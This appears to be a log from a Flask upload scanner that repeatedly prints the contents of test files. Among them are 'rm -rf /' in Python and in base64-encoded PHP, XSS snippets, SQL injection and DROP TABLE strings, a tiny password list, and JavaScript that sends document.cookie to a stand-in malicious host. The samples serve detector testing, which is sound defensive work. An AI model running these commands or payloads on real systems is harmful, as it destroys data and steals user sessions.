2025-02-22 19:10:38,928 - 127.0.0.1 - - [22/Feb/2025 19:10:38] "[32mGET /delete/3 HTTP/1.1[0m" 302 -
2025-02-22 19:10:38,933 - 127.0.0.1 - - [22/Feb/2025 19:10:38] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:39,359 - 127.0.0.1 - - [22/Feb/2025 19:10:39] "[32mGET /delete/4 HTTP/1.1[0m" 302 -
2025-02-22 19:10:39,364 - 127.0.0.1 - - [22/Feb/2025 19:10:39] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:39,804 - 127.0.0.1 - - [22/Feb/2025 19:10:39] "[32mGET /delete/9 HTTP/1.1[0m" 302 -
2025-02-22 19:10:39,808 - 127.0.0.1 - - [22/Feb/2025 19:10:39] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:41,658 - 127.0.0.1 - - [22/Feb/2025 19:10:41] "[32mGET /delete/10 HTTP/1.1[0m" 302 -
2025-02-22 19:10:41,662 - 127.0.0.1 - - [22/Feb/2025 19:10:41] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:42,800 - 127.0.0.1 - - [22/Feb/2025 19:10:42] "[32mGET /delete/11 HTTP/1.1[0m" 302 -
2025-02-22 19:10:42,805 - 127.0.0.1 - - [22/Feb/2025 19:10:42] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:43,194 - 127.0.0.1 - - [22/Feb/2025 19:10:43] "[32mGET /delete/12 HTTP/1.1[0m" 302 -
2025-02-22 19:10:43,198 - 127.0.0.1 - - [22/Feb/2025 19:10:43] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:43,545 - 127.0.0.1 - - [22/Feb/2025 19:10:43] "[32mGET /delete/13 HTTP/1.1[0m" 302 -
2025-02-22 19:10:43,549 - 127.0.0.1 - - [22/Feb/2025 19:10:43] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:43,911 - 127.0.0.1 - - [22/Feb/2025 19:10:43] "[32mGET /delete/14 HTTP/1.1[0m" 302 -
2025-02-22 19:10:43,915 - 127.0.0.1 - - [22/Feb/2025 19:10:43] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:44,280 - 127.0.0.1 - - [22/Feb/2025 19:10:44] "[32mGET /delete/15 HTTP/1.1[0m" 302 -
2025-02-22 19:10:44,285 - 127.0.0.1 - - [22/Feb/2025 19:10:44] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:44,734 - 127.0.0.1 - - [22/Feb/2025 19:10:44] "[32mGET /delete/16 HTTP/1.1[0m" 302 -
2025-02-22 19:10:44,738 - 127.0.0.1 - - [22/Feb/2025 19:10:44] "GET / HTTP/1.1" 200 -
2025-02-22 19:10:51,854 - Extracted content from uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:10:51,867 - 127.0.0.1 - - [22/Feb/2025 19:10:51] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:10:51,871 - 127.0.0.1 - - [22/Feb/2025 19:10:51] "GET / HTTP/1.1" 200 -
2025-02-22 19:14:49,556 - Extracted content from uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:14:49,561 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:14:49,561 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:14:49,561 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:14:49,561 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:14:49,561 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:14:49,561 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:14:49,561 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:14:49,565 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:14:49,569 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:14:49,569 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:14:49,571 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 19:14:49,571 - [33mPress CTRL+C to quit[0m
2025-02-22 19:34:52,604 - 127.0.0.1 - - [22/Feb/2025 19:34:52] "GET / HTTP/1.1" 200 -
2025-02-22 19:35:08,575 - Extracted content from uploads/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 19:35:08,575 - Malicious pattern detected in uploads/malicious.pptx
2025-02-22 19:35:08,577 - 127.0.0.1 - - [22/Feb/2025 19:35:08] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:35:08,580 - 127.0.0.1 - - [22/Feb/2025 19:35:08] "GET / HTTP/1.1" 200 -
2025-02-22 19:35:31,177 - Extracted content from uploads/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 19:35:31,177 - Malicious pattern detected in uploads/malicious.pptx
2025-02-22 19:35:31,177 - 127.0.0.1 - - [22/Feb/2025 19:35:31] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:35:31,181 - 127.0.0.1 - - [22/Feb/2025 19:35:31] "GET / HTTP/1.1" 200 -
2025-02-22 19:35:34,446 - 127.0.0.1 - - [22/Feb/2025 19:35:34] "GET / HTTP/1.1" 200 -
2025-02-22 19:35:48,257 - Extracted content from uploads/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 19:35:48,257 - Malicious pattern detected in uploads/malicious.xlsx
2025-02-22 19:35:48,258 - 127.0.0.1 - - [22/Feb/2025 19:35:48] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:35:48,262 - 127.0.0.1 - - [22/Feb/2025 19:35:48] "GET / HTTP/1.1" 200 -
2025-02-22 19:36:01,007 - Extracted content from uploads/flask_file_upload/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-22 19:36:01,007 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/create_malicious_xlsx.py
2025-02-22 19:36:01,007 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 19:36:01,008 - Extracted content from uploads/flask_file_upload/flask_file_upload/app.py: from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sqlite3
import re
import logging
import zipfile
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['TRASH_FOLDER'] = 'trash'
app.config['ALLOWED_EXTENSIONS'] = {"docx", "xls", "xlsx", "ppt", "pptx", "odt", "txt", "py", "js", "c", "java", "zip", "r", "bsv", "yaml", "xml", "word", "xl", "xss", 
2025-02-22 19:36:01,009 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/app.py
2025-02-22 19:36:01,009 - Extracted content from uploads/flask_file_upload/flask_file_upload/create_malicious_pptx.py: from pptx import Presentation

def create_malicious_pptx(filename):
    # Create a new Presentation
    ppt = Presentation()
    
    # Add a slide
    slide = ppt.slides.add_slide(ppt.slide_layouts[5])  # Title Slide layout
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "<script>alert('XSS');</script>",
        "eval('some malicious code');"
    ]
    
    for line in suspicious_content:

2025-02-22 19:36:01,009 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/create_malicious_pptx.py
2025-02-22 19:36:01,016 - Extracted content from uploads/flask_file_upload/flask_file_upload/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 19:36:01,016 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/malicious.xlsx
2025-02-22 19:36:01,022 - Extracted content from uploads/flask_file_upload/flask_file_upload/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 19:36:01,022 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/malicious.pptx
2025-02-22 19:36:01,028 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:01,033 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:01,038 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:01,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:36:01,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:01,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:01,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:01,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:01,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:01,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:01,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:36:01,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 19:36:01,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 19:36:01,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 19:36:01,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:01,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 19:36:01,051 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/trash/test_doc_hidden.docx
2025-02-22 19:36:01,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:01,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:01,060 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:01,060 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 19:36:01,060 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/trash/1.sql
2025-02-22 19:36:01,060 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:01,060 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:01,060 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 19:36:01,061 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:01,061 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:01,061 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 19:36:01,062 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 19:36:01,062 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 19:36:01,062 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 19:36:01,062 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:01,062 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:01,069 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:01,072 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:01,072 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:01,072 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:01,072 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 19:36:01,073 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:01,073 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:01,077 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:01,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:01,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:01,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:01,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:01,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:01,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:36:01,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:01,085 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:01,089 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:36:01,089 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:01,091 - 127.0.0.1 - - [22/Feb/2025 19:36:01] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 19:36:01,095 - 127.0.0.1 - - [22/Feb/2025 19:36:01] "GET / HTTP/1.1" 200 -
2025-02-22 19:36:33,706 - Extracted content from uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:33,711 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 19:36:33,711 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 19:36:33,711 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 19:36:33,711 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 19:36:33,711 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:33,711 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:33,718 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:33,722 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:33,722 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:33,722 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:33,722 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 19:36:33,722 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:33,722 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:33,727 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:33,731 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:33,731 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:33,731 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:33,731 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:33,731 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:33,731 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:36:33,731 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:33,736 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:33,740 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:36:33,740 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:33,740 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:33,740 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:33,740 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:33,740 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:33,740 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:33,740 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:36:33,740 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:33,745 - Extracted content from uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:33,748 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
